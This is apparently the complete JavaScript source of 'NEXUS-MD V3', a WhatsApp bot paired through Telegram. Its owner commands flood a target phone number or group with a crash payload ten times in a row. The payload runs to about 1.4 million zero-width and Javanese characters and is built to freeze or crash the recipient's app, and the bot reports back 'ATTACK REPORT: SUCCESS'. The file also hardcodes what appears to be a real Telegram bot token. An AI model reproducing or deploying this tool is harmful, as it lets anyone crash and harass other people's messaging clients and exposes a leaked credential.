const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay,
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;
const CHANNEL_URL = "https://whatsapp.com/channel/0029Vb7a9bO6RGJKJbh4xR0F";
const AD_IMAGE_URL = "https://telegra.ph/file/a8a183d25667e41793741.jpg";

let botConfig = {
    botName: "NEXUS-MD V3 3M SUPREME",
    owner: "94767475809", 
    prefix: ".",
};

app.get('/', (req, res) => res.send('Nexus System Online! ☠️'));
app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "110.0.5481.178"], 
        printQRInTerminal: false,
        syncFullHistory: false
    });

    // --- 🤖 TELEGRAM PAIRING ---
    tgBot.on('message', async (msg) => {
        const text = msg.text;
        const chatId = msg.chat.id;
        if (text === '/start') {
            return tgBot.sendMessage(chatId, "☠️ *NEXUS-MD V3 3M SUPREME*\n\nEnter your WhatsApp number with 94 code.", { parse_mode: 'Markdown' });
        }
        if (text && /^\d+$/.test(text) && text.length > 9) {
            try {
                tgBot.sendMessage(chatId, "⏳ *Connecting...*");
                await delay(2000);
                let code = await sock.requestPairingCode(text.trim());
                tgBot.sendMessage(chatId, `🔥 *PAIRING KEY:* \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) { tgBot.sendMessage(chatId, "❌ Error!"); }
        }
    });

    // --- 📩 MESSAGE HANDLER ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            const from = mek.key.remoteJid;
            const isOwner = mek.key.fromMe || from.startsWith(botConfig.owner);
            if (!isOwner) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const args = body.trim().split(/ +/).slice(1);
            const targetNum = args[0] ? args[0].replace(/[^0-9]/g, '') : null;
            const targetJid = targetNum + "@s.whatsapp.net";

            // 🔥 3M SUPREME PAYLOAD
            const deadlyBug = "☠️ *NEXUS 3M SUPREME* ☠️\n" + "​".repeat(1000000) + "ꦿ".repeat(400000);

            switch (command) {
                case 'menu':
                case 'bug':
                    const gammataMenu = `
┏━━━━━━━━━━━━━━━━━━━━┓
┃  ☣️ *NEXUS-MD V3 SUPREME* ☣️
┗━━━━━━━━━━━━━━━━━━━━┛
┃
┃ 🩸 *NATURE:* _Global Destroyer_
┃ 🦠 *POWER:* \`3,000,000+\` Characters
┃ ⚡ *STATUS:* _Master Private Online_
┃ 💻 *DEV:* _Sasiya MD_
┃
┣━━━━━━━━━━━━━━━━━━━━┓
┃  🔥 *S U P R E M E  B U G S*
┣━━━━━━━━━━━━━━━━━━━━┛
┃
┃ ☠️ *.vid_crash* [num]
┃ 🔥 *.ios_dead* [num]
┃ 💀 *.kill* [num]
┃ ❄️ *.freeze* [num]
┃ 🌀 *.group* [jid]
┃ 🌌 *.the_end* [num]
┃
┣━━━━━━━━━━━━━━━━━━━━┓
┃  🛡️ *D E V E L O P E R  N E X U S*
┗━━━━━━━━━━━━━━━━━━━━┛`;

                    await sock.sendMessage(from, { 
                        text: gammataMenu,
                        contextInfo: { 
                            externalAdReply: { 
                                title: "NEXUS-MD 3M MENU ACTIVE ⚡",
                                body: "Supreme Bug Destroyer Ready 💀",
                                mediaType: 1,
                                thumbnailUrl: AD_IMAGE_URL, 
                                sourceUrl: CHANNEL_URL
                            }
                        }
                    }, { quoted: mek });
                    break;

                // --- ALL BUG COMMANDS ---
                case 'kill':
                case 'vid_crash':
                case 'ios_dead':
                case 'freeze':
                case 'the_end':
                    if (!targetNum) return sock.sendMessage(from, { text: "❌ Number එකක් දීපන් මචං!" });
                    
                    await sock.sendMessage(from, { text: `🌑 *DEPLOYING:* ${command.toUpperCase()}\n🎯 *TARGET:* ${targetNum}` });

                    for(let i=0; i<10; i++) {
                        await sock.sendMessage(targetJid, { text: deadlyBug });
                        await delay(300);
                    }

                    // Success Report
                    const report = `╭───〔 *ATTACK REPORT* 〕───┈\n│\n│ ✅ *STATUS:* SUCCESS\n│ 🎯 *TARGET:* ${targetNum}\n│ 🦠 *MODE:* ${command}\n│ 🕒 *TIME:* ${new Date().toLocaleTimeString()}\n╰─────────────┈`;
                    await sock.sendMessage(from, { text: report }, { quoted: mek });
                    break;

                case 'group':
                    if (!args[0]) return;
                    await sock.sendMessage(from, { text: "🌀 *WIPING GROUP...*" });
                    for(let i=0; i<10; i++) {
                        await sock.sendMessage(args[0], { text: deadlyBug });
                        await delay(300);
                    }
                    break;
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (up) => { if (up.connection === 'close') startNexus(); });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
